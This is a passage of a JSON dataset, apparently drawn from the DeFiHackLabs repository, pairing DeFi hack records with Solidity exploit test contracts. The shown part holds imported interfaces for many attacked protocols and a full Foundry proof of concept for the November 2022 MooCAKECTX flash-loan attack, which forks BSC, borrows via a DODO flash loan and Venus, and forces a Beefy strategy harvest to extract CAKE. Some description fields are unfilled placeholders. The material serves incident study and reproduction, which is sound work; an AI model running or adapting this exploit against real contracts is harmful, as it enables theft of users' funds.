                        "content": "interface IBuildFinance {\n  function propose(\n    address _target,\n    uint256 _value,\n    bytes memory _data\n  ) external returns (uint256);\n\n  function vote(uint256 _proposalId, bool _support) external;\n\n  function execute(\n    uint256 _proposalId,\n    address _target,\n    uint256 _value,\n    bytes memory _data\n  ) external payable returns (bytes memory);\n\n  function mint(address account, uint256 amount) external;\n\n  function proposalCount() external returns (int256);\n\n  function state(uint256 proposalId) external returns (uint256);\n}\n",
                        "token_count": 124,
                        "imported": true
                    },
                    {
                        "name": "MultiSig",
                        "content": "interface MultiSig {\n  function confirmTransaction(uint256 transactionId) external;\n\n  function submitTransaction(\n    address destination,\n    uint256 value,\n    bytes memory data\n  ) external returns (uint256 transactionId);\n\n  function getConfirmations(uint256 transactionId)\n  external\n  view\n  returns (address[] memory _confirmations);\n\n  function required() external view returns (uint256);\n}\n",
                        "token_count": 82,
                        "imported": true
                    },
                    {
                        "name": "Flippaz",
                        "content": "interface Flippaz {\n  function bid() external payable;\n\n  function ownerWithdrawAllTo(address toAddress) external;\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "IDOODLENFTXVault",
                        "content": "interface IDOODLENFTXVault{\n\n  function flashLoan(\n    address receiver,\n    address token,\n    uint256 amount,\n    bytes memory data\n  ) external returns (bool);\n  function redeem(uint256 amount, uint256[] calldata specificIds)\n  external\n  returns (uint256[] calldata);\n  function balanceOf(address account) external view returns (uint256);\n  function mint(\n    uint256[] calldata tokenIds,\n    uint256[] calldata amounts /* ignored for ERC721 vaults */\n  ) external returns (uint256);\n\n}\n",
                        "token_count": 116,
                        "imported": true
                    },
                    {
                        "name": "ISushiSwap",
                        "content": "interface ISushiSwap{\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n}\n",
                        "token_count": 84,
                        "imported": true
                    },
                    {
                        "name": "IOmni",
                        "content": "interface IOmni{\n\n  function supplyERC721(\n    address asset,\n    DataTypes.ERC721SupplyParams[] memory tokenData,\n    address onBehalfOf,\n    uint16 referralCode\n  ) external;\n\n  function withdrawERC721(\n    address asset,\n    uint256[] memory tokenIds,\n    address to\n  ) external returns (uint256);\n  function liquidationERC721(\n    address collateralAsset,\n    address liquidationAsset,\n    address user,\n    uint256 collateralTokenId,\n    uint256 liquidationAmount,\n    bool receiveNToken\n  ) external;\n\n  struct ERC721SupplyParams {\n    uint256 tokenId;\n    bool useAsCollateral;\n  }\n  function borrow(\n    address asset,\n    uint256 amount,\n    uint256 interestRateMode,\n    uint16 referralCode,\n    address onBehalfOf\n  ) external;\n\n  function getUserAccountData(address user)\n  external\n  view\n  returns (\n    uint256 totalCollateralBase,\n    uint256 totalDebtBase,\n    uint256 availableBorrowsBase,\n    uint256 currentLiquidationThreshold,\n    uint256 ltv,\n    uint256 healthFactor,\n    uint256 erc721HealthFactor\n  );\n\n}\n",
                        "token_count": 252,
                        "imported": true
                    },
                    {
                        "name": "DataTypes",
                        "content": "interface DataTypes {\n  struct ERC721SupplyParams {\n    uint256 tokenId;\n    bool useAsCollateral;\n  }\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "ILib",
                        "content": "interface ILib {\n  function attack() external returns (bool);\n\n  function withdrawAll() external returns (bool);\n}\n",
                        "token_count": 24,
                        "imported": true
                    },
                    {
                        "name": "FToken",
                        "content": "interface FToken {}\n",
                        "token_count": 4,
                        "imported": true
                    },
                    {
                        "name": "IGovernorAlpha",
                        "content": "interface IGovernorAlpha {\n  function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) external returns (uint);\n  function castVote(uint proposalId, bool support) external;\n  function queue(uint proposalId) external;\n  function execute(uint proposalId) external payable;\n  function state(uint proposalId) external view;\n}\n",
                        "token_count": 83,
                        "imported": true
                    },
                    {
                        "name": "IChain",
                        "content": "interface IChain {\n  function submit (\n    uint32 _dataTimestamp,\n    bytes32 _root,\n    bytes32[] memory _keys,\n    uint256[] memory _values,\n    uint8[] memory _v,\n    bytes32[] memory _r,\n    bytes32[] memory _s\n  ) external;\n}\n",
                        "token_count": 66,
                        "imported": true
                    },
                    {
                        "name": "IFortressPriceOracle",
                        "content": "interface IFortressPriceOracle {\n  function getUnderlyingPrice(FToken fToken) external view returns (uint);\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "IFTS",
                        "content": "interface IFTS {\n  function approve(address spender, uint rawAmount) external returns (bool);\n  function balanceOf(address account) external view returns (uint);\n}\n",
                        "token_count": 34,
                        "imported": true
                    },
                    {
                        "name": "IfFTS",
                        "content": "interface IfFTS {\n  function mint(uint mintAmount) external returns (uint);\n  function balanceOf(address owner) external view returns (uint256);\n}\n",
                        "token_count": 32,
                        "imported": true
                    },
                    {
                        "name": "IFBep20Delegator",
                        "content": "interface IFBep20Delegator {\n  function getCash() external view returns (uint);\n  function borrow(uint borrowAmount) external returns (uint);\n  function underlying() external returns (address);\n}\n",
                        "token_count": 42,
                        "imported": true
                    },
                    {
                        "name": "IBorrowerOperations",
                        "content": "interface IBorrowerOperations {\n  function openTrove(\n    uint256 _maxFee,\n    uint256 _LUSDAmount,\n    uint256 _ETHAmount,\n    address _upperHint,\n    address _lowerHint,\n    address _frontEndTag\n  ) external;\n}\n",
                        "token_count": 58,
                        "imported": true
                    },
                    {
                        "name": "IARTH",
                        "content": "interface IARTH is IERC20 {}\n",
                        "token_count": 8,
                        "imported": true
                    },
                    {
                        "name": "IARTHUSD",
                        "content": "interface IARTHUSD {\n  function balanceOf(address) external returns (uint256);\n  function approve(address, uint256) external returns (bool);\n}\n",
                        "token_count": 31,
                        "imported": true
                    },
                    {
                        "name": "IVyper",
                        "content": "interface IVyper {\n  function exchange_underlying(int128, int128, uint256, uint256, address) external returns (uint256);\n}\n",
                        "token_count": 30,
                        "imported": true
                    },
                    {
                        "name": "I88mph",
                        "content": "interface I88mph {\n  function init(\n    address newOwner,\n    string memory tokenName,\n    string memory tokenSymbol\n  ) external;\n  function mint(address to, uint256 tokenId) external;\n  function burn(uint256 tokenId) external;\n  function owner() external view returns (address);\n  function ownerOf(uint256 tokenId) external view returns (address);\n}\n",
                        "token_count": 76,
                        "imported": true
                    },
                    {
                        "name": "IBAYCi",
                        "content": "interface IBAYCi {\n  function setApprovalForAll(address operator, bool approved) external;\n  function transferFrom(\n    address from,\n    address to,\n    uint256 tokenId\n  ) external;\n}\n",
                        "token_count": 42,
                        "imported": true
                    },
                    {
                        "name": "INFTXVault",
                        "content": "interface INFTXVault {\n  function redeem(uint256 amount, uint256[] memory specificIds)\n  external\n  returns (uint256[] memory);\n  function flashLoan(\n    address receiver,\n    address token,\n    uint256 amount,\n    bytes memory data\n  ) external returns (bool);\n  function approve(address spender, uint256 amount) external returns (bool);\n  function mint(uint256[] memory tokenIds, uint256[] memory amounts)\n  external\n  returns (uint256);\n}\n",
                        "token_count": 102,
                        "imported": true
                    },
                    {
                        "name": "IAirdrop",
                        "content": "interface IAirdrop {\n  function claimTokens() external;\n}\n",
                        "token_count": 13,
                        "imported": true
                    },
                    {
                        "name": "ILand",
                        "content": "interface ILand {\n  function _burn(\n    address from,\n    address owner,\n    uint256 id\n  ) external;\n  function _numNFTPerAddress(address) external view returns (uint256);\n}\n",
                        "token_count": 44,
                        "imported": true
                    },
                    {
                        "name": "IERC20Metadata",
                        "content": "interface IERC20Metadata is IERC20 {\n  function name() external view returns (string memory);\n  function symbol() external view returns (string memory);\n  function decimals() external view returns (uint8);\n}\n",
                        "token_count": 44,
                        "imported": true
                    },
                    {
                        "name": "IWFTM",
                        "content": "interface IWFTM is IERC20Metadata {\n  event Deposit(address indexed dst, uint wad);\n  event Withdrawal(address indexed src, uint wad);\n  receive() external payable;\n  fallback () external payable;\n  function deposit() external payable;\n  function withdraw(uint wad) external;\n}\n",
                        "token_count": 62,
                        "imported": true
                    },
                    {
                        "name": "IGrimBoostVault",
                        "content": "interface IGrimBoostVault {\n  event NewStratCandidate(address implementation);\n  event UpgradeStrat(address implementation);\n  function want() external view returns (IERC20);\n  function balance() external view returns (uint);\n  function available() external view returns (uint256);\n  function getPricePerFullShare() external view returns (uint256);\n  function depositAll() external;\n  function deposit(uint _amount) external;\n  function earn() external;\n  function withdrawAll() external;\n  function withdraw(uint256 _shares) external;\n  function proposeStrat(address _implementation) external;\n  function upgradeStrat() external;\n  function inCaseTokensGetStuck(address _token) external;\n  function depositFor(address token, uint _amount,address user ) external;\n}\n",
                        "token_count": 158,
                        "imported": true
                    },
                    {
                        "name": "IFlashLoanRecipient",
                        "content": "interface IFlashLoanRecipient {\n  function receiveFlashLoan(\n    IERC20[] memory tokens,\n    uint256[] memory amounts,\n    uint256[] memory feeAmounts,\n    bytes memory userData\n  ) external;\n}\n",
                        "token_count": 46,
                        "imported": true
                    },
                    {
                        "name": "IBeethovenVault",
                        "content": "interface IBeethovenVault {\n  function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IRedactedCartelSafeERC20",
                        "content": "interface IRedactedCartelSafeERC20 {\n  function unFreezeToken () external;\n  function balanceOf(address account) external view returns (uint256);\n  function approve(address spender, uint256 amount) external returns (bool);\n  function allowance(address owner, address spender) external view returns (uint256);\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 84,
                        "imported": true
                    },
                    {
                        "name": "IBadGuysRPFERC721",
                        "content": "interface IBadGuysRPFERC721{\n  function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;\n\n  function balanceOf(address owner) external view returns (uint256 balance);\n\n  function flipPauseMinting() external;\n}\n",
                        "token_count": 59,
                        "imported": true
                    },
                    {
                        "name": "IAkutarNFT",
                        "content": "interface IAkutarNFT{\n\n  function processRefunds() external;\n\n  function bid(uint8 amount) external payable;\n\n  function claimProjectFunds() external;\n\n}\n",
                        "token_count": 35,
                        "imported": true
                    },
                    {
                        "name": "IFortubeBank",
                        "content": "interface IFortubeBank {\n    function flashloan( address receiver, address token, uint256 amount, bytes memory params) external;\n    function repay(address token, uint256 repayAmount) external payable returns (uint256);\n    function controller() external returns(address);\n}\n",
                        "token_count": 54,
                        "imported": true
                    },
                    {
                        "name": "IVaultFlipToFlip",
                        "content": "interface IVaultFlipToFlip {\n    function deposit(uint _amount) external;\n    function earned(address account) external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function principalOf(address account) external view returns (uint);\n    function harvest() external returns (uint bounty);\n    function pid() external returns (uint);\n    function getReward() external;\n}\n",
                        "token_count": 81,
                        "imported": true
                    },
                    {
                        "name": "IBunnyZap",
                        "content": "interface IBunnyZap {\n    function zapIn(address _to) external payable;\n    function zapInToken(address _from, uint amount, address _to) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IElevenNeverSellVault",
                        "content": "interface IElevenNeverSellVault {\n    function depositAll() external;\n    function emergencyBurn() external;\n    function withdrawAll() external;\n}\n",
                        "token_count": 30,
                        "imported": true
                    },
                    {
                        "name": "IOpyn",
                        "content": "interface IOpyn{\n    function addERC20CollateralOption(\n      uint256 amtToCreate,\n      uint256 amtCollateral,\n      address receiver\n    ) external;\n\n    function exercise(\n      uint256 oTokensToExercise,\n      address payable[] memory vaultsToExerciseFrom\n    ) external payable;\n\n    function removeUnderlying() external;\n}\n",
                        "token_count": 73,
                        "imported": true
                    },
                    {
                        "name": "ICFToken",
                        "content": "interface ICFToken {\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "IDPPOracle",
                        "content": "interface IDPPOracle {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address _assetTo,\n        bytes calldata data\n    ) external;\n}\n",
                        "token_count": 41,
                        "imported": true
                    },
                    {
                        "name": "IDODOCallee",
                        "content": "interface IDODOCallee {\n    // function DVMSellShareCall(\n    //     address sender,\n    //     uint256 burnShareAmount,\n    //     uint256 baseAmount,\n    //     uint256 quoteAmount,\n    //     bytes calldata data\n    // ) external;\n\n    // function DVMFlashLoanCall(\n    //     address sender,\n    //     uint256 baseAmount,\n    //     uint256 quoteAmount,\n    //     bytes calldata data\n    // ) external;\n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external;\n\n  //   function DSPFlashLoanCall(\n  //       address sender,\n  //       uint256 baseAmount,\n  //       uint256 quoteAmount,\n  //       bytes calldata data\n  //   ) external;\n\n  //   function CPCancelCall(\n  //       address sender,\n  //       uint256 amount,\n  //       bytes calldata data\n  //   ) external;\n\n\t// function CPClaimBidCall(\n  //       address sender,\n  //       uint256 baseAmount,\n  //       uint256 quoteAmount,\n  //       bytes calldata data\n  //   ) external;\n\n  //   function NFTRedeemCall(\n  //       address payable assetTo,\n  //       uint256 quoteAmount,\n  //       bytes calldata\n  //   ) external;\n}\n",
                        "token_count": 302,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "10ce46e4f4",
        "is_ready": false,
        "content": "### 20221107 MooCAKECTX - FlashLoan Attack\n### Lost: $140k\n#### Contract\n[MooCAKECTX_exp.sol](src/test/MooCAKECTX_exp.sol)\n#### Link reference\nhttps://twitter.com/BeosinAlert/status/1589501207181393920\nhttps://twitter.com/CertiKAlert/status/1589428153591615488",
        "date": "20221107",
        "target": "MooCAKECTX",
        "attack_title": "FlashLoan Attack",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BeosinAlert/status/1589501207181393920",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/CertiKAlert/status/1589428153591615488",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/MooCAKECTX_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1589501207181393920\n// https://twitter.com/CertiKAlert/status/1589428153591615488\n// TX\n// https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e\ninterface VBUSD {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\ninterface VCAKE {\n    function borrow(uint256 borrowAmount) external;\n    function repayBorrow(uint256 repayAmount) external;\n}\ninterface BeefyVault {\n    function depositAll() external;\n    function withdrawAll() external;\n}\ninterface StrategySyrup {\n    function harvest() external;\n}\ncontract Harvest {\n    constructor(){\n        StrategySyrup strategySyrup = StrategySyrup(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b);\n        strategySyrup.harvest();\n    }\n}\ninterface Unitroller {\n    function getAccountLiquidity(address account) external returns(uint, uint, uint);  \n    function enterMarkets(address[] calldata vTokens) external;   \n}\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 CTK = IERC20(0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 CAKE = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);\n    VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);\n    VCAKE vCAKE = VCAKE(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);\n    BeefyVault beefyVault = BeefyVault(0x489afbAED0Ea796712c9A6d366C16CA3876D8184);\n    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    address constant SmartChef = 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode \n        cheats.createSelectFork(\"bsc\", 22832427);\n    }\n    function testExploit() public{\n        address(WBNB).call{value: 3 ether}(\"\");\n        WBNBToCTK();\n        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));\n        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker CAKE balance after exploit\",\n            CAKE.balanceOf(address(this)),\n            18);\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        address [] memory cTokens = new address[](2);\n        cTokens[0] = address(vBUSD);\n        cTokens[1] = address(vCAKE);\n        unitroller.enterMarkets(cTokens);\n        BUSD.approve(address(vBUSD), type(uint).max);\n        vBUSD.mint(BUSD.balanceOf(address(this)));\n        vCAKE.borrow(50_000 * 1e18);\n        CAKE.approve(address(beefyVault), type(uint).max);\n        beefyVault.depositAll();\n        // Removing this step, the profit seem to be higher \n        // because the harveset() funciton will swap some CAKE to WBNB\n        Harvest harvest = new Harvest();\n        beefyVault.withdrawAll();\n        CAKE.approve(address(vCAKE), type(uint).max);\n        vCAKE.repayBorrow(50_000 * 1e18);\n        vBUSD.redeemUnderlying(400_000 * 1e18);\n        BUSD.transfer(dodo, 400_000 * 1e18);\n    }\n    function WBNBToCTK() internal {\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(CTK);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n}",
                "token_count": 1277,
                "interfaces": [
                    {
                        "name": "VBUSD",
                        "content": "interface VBUSD {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n",
                        "token_count": 27,
                        "imported": false
                    },
                    {
                        "name": "VCAKE",
                        "content": "interface VCAKE {\n    function borrow(uint256 borrowAmount) external;\n    function repayBorrow(uint256 repayAmount) external;\n}\n",
                        "token_count": 28,
                        "imported": false
                    },
                    {
                        "name": "BeefyVault",
                        "content": "interface BeefyVault {\n    function depositAll() external;\n    function withdrawAll() external;\n}\n",
                        "token_count": 20,
                        "imported": false
                    },
                    {
                        "name": "Unitroller",
                        "content": "interface Unitroller {\n    function getAccountLiquidity(address account) external returns(uint, uint, uint);  \n    function enterMarkets(address[] calldata vTokens) external;   \n}\n",
                        "token_count": 39,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    